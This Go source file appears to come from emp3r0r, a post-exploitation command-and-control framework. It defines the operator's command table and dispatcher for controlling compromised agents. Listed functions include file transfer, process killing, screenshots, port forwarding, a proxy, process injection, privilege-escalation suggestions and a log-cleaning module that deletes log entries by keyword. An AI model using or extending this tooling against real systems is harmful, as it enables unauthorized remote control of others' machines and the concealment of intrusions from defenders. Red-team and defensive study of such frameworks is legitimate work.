package cc

import (
	"fmt"
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/agent"
)

// Commands holds all commands and their help string, command: help
var Commands = map[string]string{
	HELP:              "Print this help, 'help <module>' gives help for a module",
	"target":          "Set target. eg. `target <index>`",
	"set":             "Set an option. eg. `set <option> <val>`",
	"use":             "Use a module. eg. `use <module_name>`",
	"run":             "Run selected module, make sure you have set required options",
	"info":            "What options do we have?",
	"gen_agent":       "Generate agent with provided binary and build.json",
	"ls":              "List current directory of selected agent",
	"cd":              "Change current working directory of selected agent",
	"rm":              "Delete a file/directory on selected agent",
	"pwd":             "Current working directory of selected agent",
	"ps":              "Process list of selected agent",
	"kill":            "Terminate a process on selected agent: eg. `kill <pid>`",
	"get":             "Download a file from selected agent",
	"put":             "Upload a file to selected agent",
	"screenshot":      "Take a screenshot of selected agent",
	"ls_targets":      "List all targets",
	"ls_modules":      "List all modules",
	"ls_port_fwds":    "List all port mappings",
	"delete_port_fwd": "Delete a port mapping",
	"exit":            "Exit",
}

// CmdHelpers holds a map of helper functions
var CmdHelpers = map[string]func(){
	"ls_targets":   ListTargets,
	"ls_modules":   ListModules,
	"ls_port_fwds": ListPortFwds,
	"info":         CliListOptions,
	"run":          ModuleRun,
	"screenshot":   TakeScreenshot,
	"gen_agent":    GenAgent,
}

// FileManagerHelpers manage agent files
var FileManagerHelpers = map[string]func(string){
	"ls":   NoArgCmd,
	"pwd":  NoArgCmd,
	"cd":   SingleArgCmd,
	"rm":   SingleArgCmd,
	"put":  UploadToAgent,
	"get":  DownloadFromAgent,
	"ps":   NoArgCmd,
	"kill": SingleArgCmd,
}

const HELP = "help" // fuck goconst

// CmdHandler processes user commands
func CmdHandler(cmd string) (err error) {
	cmdSplit := strings.Fields(cmd)
	if len(cmdSplit) < 0 {
		return
	}

	switch {
	case cmd == "":
		return
	case cmdSplit[0] == HELP:
		if len(cmdSplit) > 2 {
			CliPrintError("WTF?")
			return
		}
		if len(cmdSplit) == 1 {
			CmdHelp("")
			return
		}
		CmdHelp(cmdSplit[1])

	case cmdSplit[0] == "use":
		if len(cmdSplit) != 2 {
			CliPrintError("use what? " + strconv.Quote(cmd))
			return
		}
		defer SetDynamicPrompt()
		for mod := range ModuleHelpers {
			if mod == cmdSplit[1] {
				CurrentMod = cmdSplit[1]
				for k := range Options {
					delete(Options, k)
				}
				UpdateOptions(CurrentMod)
				CliPrintInfo("Using module %s", strconv.Quote(CurrentMod))
				return
			}
		}
		CliPrintError("No such module: %s", strconv.Quote(cmdSplit[1]))

	case cmdSplit[0] == "set":
		if len(cmdSplit) < 3 {
			CliPrintError("set what? " + strconv.Quote(cmd))
			return
		}

		// hand to SetOption helper
		SetOption(cmdSplit[1:])

	case cmdSplit[0] == "delete_port_fwd":
		if len(cmdSplit) < 2 {
			CliPrintError("Delete what port mapping? " + strconv.Quote(cmd))
			return
		}
		DeletePortFwdSession(cmdSplit[1])

	case cmdSplit[0] == "target":
		if len(cmdSplit) != 2 {
			CliPrintError("set target to what? " + strconv.Quote(cmd))
			return
		}
		defer SetDynamicPrompt()

		index, e := strconv.Atoi(cmdSplit[1])
		if e != nil {
			CurrentTarget = GetTargetFromTag(cmdSplit[1])
			if CurrentTarget != nil {
				CliPrintSuccess("Now targeting %s", CurrentTarget.Tag)
				return nil
			}
			return fmt.Errorf("cannot set target by index: %v", e)
		}
		CurrentTarget = GetTargetFromIndex(index)
		if CurrentTarget == nil {
			CliPrintWarning("Target does not exist, no target has been selected")
			return fmt.Errorf("target not set or is nil")
		}
		CliPrintSuccess("Now targeting %s", CurrentTarget.Tag)

	default:
		helper := CmdHelpers[cmd]
		if helper == nil {
			filehelper := FileManagerHelpers[cmdSplit[0]]
			if filehelper == nil {
				CliPrintError("Unknown command: " + strconv.Quote(cmd))
				return
			}
			filehelper(cmd)
			return
		}
		helper()
	}
	return
}

// CmdHelp prints help in two columns
// print help for modules
func CmdHelp(mod string) {
	help := make(map[string]string)
	switch mod {
	case "":
		CliPrettyPrint("Command", "Description", &Commands)
	case agent.ModLPE_SUGGEST:
		help = map[string]string{
			"lpe_helper": "'linux-smart-enumeration' or 'linux-exploit-suggester'?",
		}
		CliPrettyPrint("Option", "Help", &help)
	case agent.ModCMD_EXEC:
		help = map[string]string{
			"cmd_to_exec": "Press TAB for some hints",
		}
		CliPrettyPrint("Option", "Help", &help)
	case agent.ModPORT_FWD:
		help = map[string]string{
			"to_port":     "Port (to forward to) on agent/CC side",
			"listen_port": "Listen on CC/agent side",
			"switch":      "Turn port mapping on/off, or use `reverse` mapping",
		}
		CliPrettyPrint("Option", "Help", &help)
	case agent.ModPROXY:
		help = map[string]string{
			"port":   "Port of our local proxy server",
			"status": "Turn proxy on/off",
		}
		CliPrettyPrint("Option", "Help", &help)
	case agent.ModINJECTOR:
		help = map[string]string{
			"pid": "Target process PID, set to 0 to start a new process (sleep)",
		}
		CliPrettyPrint("Option", "Help", &help)
	case agent.ModCLEAN_LOG:
		help = map[string]string{
			"keyword": "Delete all log entries containing this keyword",
		}
		CliPrettyPrint("Option", "Help", &help)
	default:
		for modname, modhelp := range agent.ModuleDocs {
			if mod == modname {
				help = map[string]string{"<N/A>": modhelp}
				CliPrettyPrint("Option", "Help", &help)
				return
			}
		}
		CliPrintError("Help yourself")
	}
}
